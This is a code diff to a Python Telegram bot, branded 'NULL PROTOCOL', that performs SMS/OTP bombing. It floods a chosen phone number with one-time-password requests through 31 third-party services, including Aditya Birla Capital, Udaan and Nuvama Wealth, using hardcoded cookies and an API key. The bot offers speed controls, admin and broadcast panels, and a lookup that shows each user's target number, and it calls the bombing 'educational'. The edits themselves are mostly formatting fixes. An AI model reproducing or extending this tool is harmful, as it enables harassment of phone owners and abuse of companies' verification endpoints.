@@ -10,7 +10,7 @@ import requests
 import urllib.request
 import urllib.parse
 import urllib.error
-from datetime import datetime, timedelta
+from datetime import datetime
 from dotenv import load_dotenv
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
@@ -38,12 +38,23 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Branding
-BRANDING = "\n\n🤖 **Powered by NULL PROTOCOL**"
+# ------------------------------
+# MarkdownV2 escape function
+# ------------------------------
+def escape_md(text: str) -> str:
+    """Escape special characters for Telegram MarkdownV2."""
+    chars = r'_*[]()~`>#+-=|{}.!'
+    for ch in chars:
+        text = text.replace(ch, '\\' + ch)
+    return text
 
-# ------------------------------------------------------------------
-# Advanced Bombing Configuration
-# ------------------------------------------------------------------
+# Branding (escaped)
+BRANDING_RAW = "Powered by NULL PROTOCOL"
+BRANDING = f"\n\n🤖 **{escape_md(BRANDING_RAW)}**"
+
+# ------------------------------
+# Bombing configuration
+# ------------------------------
 API_INDICES = list(range(31))
 DEFAULT_COUNTRY_CODE = "91"
 BOMBING_INTERVAL_SECONDS = 8
@@ -51,14 +62,15 @@ MIN_INTERVAL = 1
 MAX_INTERVAL = 60
 MAX_REQUEST_LIMIT = 900000000000
 TELEGRAM_RATE_LIMIT_SECONDS = 5
-AUTO_STOP_SECONDS = 20 * 60  # 20 minutes
+AUTO_STOP_SECONDS = 20 * 60          # 20 minutes
 
-bombing_active = {}
-bombing_threads = {}
-user_intervals = {}
-user_start_time = {}
+bombing_active = {}          # user_id -> threading.Event
+bombing_threads = {}         # user_id -> list of threads
+user_intervals = {}          # user_id -> current interval
+user_start_time = {}         # user_id -> start timestamp
 global_request_counter = threading.Lock()
-request_counts = {}
+request_counts = {}          # user_id -> total requests
+
 session = requests.Session()
 BASE_HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
@@ -66,7 +78,7 @@ BASE_HEADERS = {
 }
 
 # ------------------------------------------------------------------
-# getapi() – 31+ API endpoints
+# getapi() – 31 API endpoints (full version)
 # ------------------------------------------------------------------
 def getapi(pn, lim, cc):
     cc = str(cc)
@@ -417,9 +429,8 @@ def getapi(pn, lim, cc):
             response = session.post('https://vidyakul.com/signup-otp/send', headers=headers, cookies=cookies, data=data, timeout=5)
             return response.status_code == 200 or '"status":"success"' in response.text.lower()
         
-        # 27: NEW API - Aditya Birla Capital
+        # 27: Aditya Birla Capital
         elif lim == 27: 
-
             cookies = {
                 '_gcl_au': '1.1.781134033.1759810407', 
                 '_gid': 'GA1.2.1720693822.1759810408', 
@@ -456,7 +467,7 @@ def getapi(pn, lim, cc):
             response = session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers=headers, cookies=cookies, json=data, timeout=5)
             return response.status_code == 200
 
-        # 28: NEW API - Pinknblu
+        # 28: Pinknblu
         elif lim == 28:
             cookies = {
                 '_ga': 'GA1.1.1922530896.1759808413', 
@@ -487,7 +498,7 @@ def getapi(pn, lim, cc):
             response = session.post('https://pinknblu.com/v1/auth/generate/otp', headers=headers, cookies=cookies, data=data, timeout=5)
             return response.status_code == 200 or '"status":"success"' in response.text.lower()
 
-        # 29: NEW API - Udaan
+        # 29: Udaan
         elif lim == 29:
             cookies = {
                 'gid': 'GA1.2.153419917.1759810454', 
@@ -511,7 +522,7 @@ def getapi(pn, lim, cc):
             response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
             return response.status_code == 200 or 'success' in response.text.lower()
             
-        # 30: NEW API - Nuvama Wealth
+        # 30: Nuvama Wealth
         elif lim == 30:
             headers = {
               'api-key': 'c41121ed-b6fb-c9a6-bc9b-574c82929e7e', 
@@ -565,13 +576,16 @@ async def perform_bombing_task(user_id, phone_number, context):
         t.start()
     bombing_threads[str(user_id)] = workers
 
+    start_msg = (
+        f"🔥 Bombing started on `{escape_md(phone_number)}`.\n"
+        f"Using {len(API_INDICES)} APIs every {BOMBING_INTERVAL_SECONDS} seconds.\n"
+        f"Auto‑stop after 20 minutes.\n"
+        f"Use `/stop` to stop. Use `/speedup` / `/speeddown` to change interval.{BRANDING}"
+    )
     await context.bot.send_message(
         chat_id=user_id,
-        text=f"🔥 Bombing started on `{phone_number}`.\n"
-             f"Using {len(API_INDICES)} APIs every {BOMBING_INTERVAL_SECONDS} seconds.\n"
-             f"Auto‑stop after 20 minutes.\n"
-             f"Use `/stop` to stop. Use `/speedup` / `/speeddown` to change interval.{BRANDING}",
-        parse_mode="MarkdownV2"
+        text=start_msg,
+        parse_mode=ParseMode.MARKDOWN_V2
     )
 
     last_count = 0
@@ -587,10 +601,14 @@ async def perform_bombing_task(user_id, phone_number, context):
                 break
             if current_count > last_count and (current_time - last_message_time) >= TELEGRAM_RATE_LIMIT_SECONDS:
                 interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
+                status_msg = (
+                    f"📊 Status: `{current_count}` requests sent. "
+                    f"Interval: `{interval}` sec.{BRANDING}"
+                )
                 await context.bot.send_message(
                     chat_id=user_id,
-                    text=f"📊 Status: `{current_count}` requests sent. Interval: `{interval}` sec.{BRANDING}",
-                    parse_mode="MarkdownV2"
+                    text=status_msg,
+                    parse_mode=ParseMode.MARKDOWN_V2
                 )
                 last_count = current_count
                 last_message_time = current_time
@@ -608,10 +626,11 @@ async def perform_bombing_task(user_id, phone_number, context):
         final_count = request_counts.pop(user_id, 0)
         user_intervals.pop(user_id, None)
         user_start_time.pop(user_id, None)
+        final_msg = f"✅ Bombing finished. Total requests sent: `{final_count}`.{BRANDING}"
         await context.bot.send_message(
             chat_id=user_id,
-            text=f"✅ Bombing finished. Total requests sent: `{final_count}`.{BRANDING}",
-            parse_mode="MarkdownV2"
+            text=final_msg,
+            parse_mode=ParseMode.MARKDOWN_V2
         )
         if user_id in bombing_active:
             del bombing_active[user_id]
@@ -622,22 +641,34 @@ async def perform_bombing_task(user_id, phone_number, context):
 async def speedup(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in bombing_active or bombing_active[user_id].is_set():
-        await update.message.reply_text("No active bombing session. Start one with /bomb." + BRANDING)
+        await update.message.reply_text(
+            "No active bombing session. Start one with /bomb." + BRANDING,
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
         return
     current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
     new_val = max(MIN_INTERVAL, current - 1)
     user_intervals[user_id] = new_val
-    await update.message.reply_text(f"⚡ Speed increased. New interval: {new_val} seconds.{BRANDING}")
+    await update.message.reply_text(
+        f"⚡ Speed increased. New interval: {new_val} seconds.{BRANDING}",
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
 
 async def speeddown(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in bombing_active or bombing_active[user_id].is_set():
-        await update.message.reply_text("No active bombing session. Start one with /bomb." + BRANDING)
+        await update.message.reply_text(
+            "No active bombing session. Start one with /bomb." + BRANDING,
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
         return
     current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
     new_val = min(MAX_INTERVAL, current + 1)
     user_intervals[user_id] = new_val
-    await update.message.reply_text(f"🐢 Speed decreased. New interval: {new_val} seconds.{BRANDING}")
+    await update.message.reply_text(
+        f"🐢 Speed decreased. New interval: {new_val} seconds.{BRANDING}",
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
 
 # ------------------------------------------------------------------
 # Helper: send any message (text or media)
@@ -688,8 +719,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     add_user(user.id, user.username, user.first_name)
     await update.message.reply_text(
-        f"Welcome {user.first_name}! 🤖\n"
-        f"Commands:\n/bomb <number> - Start bombing (educational)\n/stop - Stop active bombing\n/speedup - Increase bombing speed\n/speeddown - Decrease bombing speed\n/menu - Show menu{BRANDING}"
+        f"Welcome {escape_md(user.first_name)}! 🤖\n"
+        f"Commands:\n/bomb <number> - Start bombing (educational)\n/stop - Stop active bombing\n/speedup - Increase bombing speed\n/speeddown - Decrease bombing speed\n/menu - Show menu{BRANDING}",
+        parse_mode=ParseMode.MARKDOWN_V2
     )
 
 async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -697,16 +729,25 @@ async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         logger.info(f"Bomb command received from {user_id} with args: {context.args}")
         if not context.args:
-            await update.message.reply_text("Usage: /bomb <phone_number>" + BRANDING)
+            await update.message.reply_text(
+                "Usage: /bomb <phone_number>" + BRANDING,
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
             return
         phone = ''.join(filter(str.isdigit, context.args[0]))
         if len(phone) < 10:
-            await update.message.reply_text("Invalid number. At least 10 digits." + BRANDING)
+            await update.message.reply_text(
+                "Invalid number. At least 10 digits." + BRANDING,
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
             return
 
         user_phone = get_user_phone(user_id)
         if user_phone and user_phone == phone:
-            await update.message.reply_text("❌ Self‑bombing is not allowed." + BRANDING)
+            await update.message.reply_text(
+                "❌ Self‑bombing is not allowed." + BRANDING,
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
             return
 
         if user_id in bombing_active and not bombing_active[user_id].is_set():
@@ -716,16 +757,25 @@ async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         asyncio.create_task(perform_bombing_task(user_id, phone, context))
     except Exception as e:
         logger.error(f"Error in bomb_command: {e}", exc_info=True)
-        await update.message.reply_text("An error occurred. Please try again later." + BRANDING)
+        await update.message.reply_text(
+            "An error occurred. Please try again later." + BRANDING,
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_flag = bombing_active.get(user_id)
     if stop_flag and not stop_flag.is_set():
         stop_flag.set()
-        await update.message.reply_text("🛑 Stop signal sent. Bombing will stop shortly." + BRANDING)
+        await update.message.reply_text(
+            "🛑 Stop signal sent. Bombing will stop shortly." + BRANDING,
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
     else:
-        await update.message.reply_text("ℹ️ No active bombing found." + BRANDING)
+        await update.message.reply_text(
+            "ℹ️ No active bombing found." + BRANDING,
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
 
 async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -733,7 +783,10 @@ async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]
         await update.message.reply_text("Menu:", reply_markup=InlineKeyboardMarkup(keyboard))
     else:
-        await update.message.reply_text("Menu:\nUse /bomb, /stop, /speedup, /speeddown" + BRANDING)
+        await update.message.reply_text(
+            "Menu:\nUse /bomb, /stop, /speedup, /speeddown" + BRANDING,
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
 
 # ------------------------------------------------------------------
 # Admin Commands (using decorators)
@@ -746,7 +799,7 @@ async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         target = int(context.args[0])
         if ban_user(target):
-            await update.message.reply_text(f"User {target} banned.{BRANDING}")
+            await update.message.reply_text(f"User {target} banned.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
         else:
             await update.message.reply_text("User not found.")
     except:
@@ -760,7 +813,7 @@ async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         target = int(context.args[0])
         if unban_user(target):
-            await update.message.reply_text(f"User {target} unbanned.{BRANDING}")
+            await update.message.reply_text(f"User {target} unbanned.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
         else:
             await update.message.reply_text("User not found or not banned.")
     except:
@@ -774,7 +827,7 @@ async def delete_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         target = int(context.args[0])
         if delete_user(target):
-            await update.message.reply_text(f"User {target} deleted.{BRANDING}")
+            await update.message.reply_text(f"User {target} deleted.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
         else:
             await update.message.reply_text("User not found.")
     except:
@@ -788,7 +841,7 @@ async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for uid in users:
         if await send_any_message(context, uid, update, text):
             success += 1
-    await update.message.reply_text(f"Broadcast sent to {success}/{len(users)} users.{BRANDING}")
+    await update.message.reply_text(f"Broadcast sent to {success}/{len(users)} users.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
 
 @admin_only
 async def dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -800,7 +853,7 @@ async def dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = " ".join(context.args[1:]) if len(context.args) > 1 else None
         success = await send_any_message(context, target, update, text)
         if success:
-            await update.message.reply_text(f"Message sent to {target}.{BRANDING}")
+            await update.message.reply_text(f"Message sent to {target}.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
         else:
             await update.message.reply_text("Failed to send.")
     except Exception as e:
@@ -821,7 +874,7 @@ async def bulk_dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for uid in ids:
         if await send_any_message(context, uid, update, text):
             success += 1
-    await update.message.reply_text(f"Sent to {success}/{len(ids)} users.{BRANDING}")
+    await update.message.reply_text(f"Sent to {success}/{len(ids)} users.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
 
 @admin_only
 async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -874,7 +927,7 @@ async def user_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         target = get_user_target(uid) or "None"
         text = f"User: {uid}\nUsername: @{user['username']}\nName: {user['first_name']}\nRole: {user['role']}\nBanned: {bool(user['banned'])}\nTarget number: {target}{BRANDING}"
-        await update.message.reply_text(text)
+        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
     except:
         await update.message.reply_text("Invalid user ID.")
 
@@ -899,7 +952,7 @@ async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         uid = int(context.args[0])
         set_admin_role(uid, True)
-        await update.message.reply_text(f"User {uid} is now admin.{BRANDING}")
+        await update.message.reply_text(f"User {uid} is now admin.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
     except:
         await update.message.reply_text("Invalid user ID.")
 
@@ -911,7 +964,7 @@ async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         uid = int(context.args[0])
         set_admin_role(uid, False)
-        await update.message.reply_text(f"User {uid} is no longer admin.{BRANDING}")
+        await update.message.reply_text(f"User {uid} is no longer admin.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
     except:
         await update.message.reply_text("Invalid user ID.")
 
@@ -986,7 +1039,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
     elif data == "admin_stats":
         count = get_user_count()
-        await query.edit_message_text(f"Total users: {count}{BRANDING}")
+        await query.edit_message_text(f"Total users: {count}{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
     elif data == "back_to_menu":
         user_id = query.from_user.id
         if is_admin(user_id):
